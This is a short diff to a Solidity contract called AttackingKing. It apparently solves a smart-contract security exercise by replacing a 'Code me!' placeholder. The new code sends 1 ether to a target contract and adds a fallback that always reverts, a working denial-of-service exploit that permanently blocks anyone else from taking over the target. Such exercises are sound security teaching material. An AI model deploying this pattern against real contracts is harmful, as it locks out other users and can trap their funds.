@@ -11,6 +11,11 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call{value: 1 ether}("");
     }
+
+    fallback() external payable {
+        revert("FAIL!");
+    }
+
 }
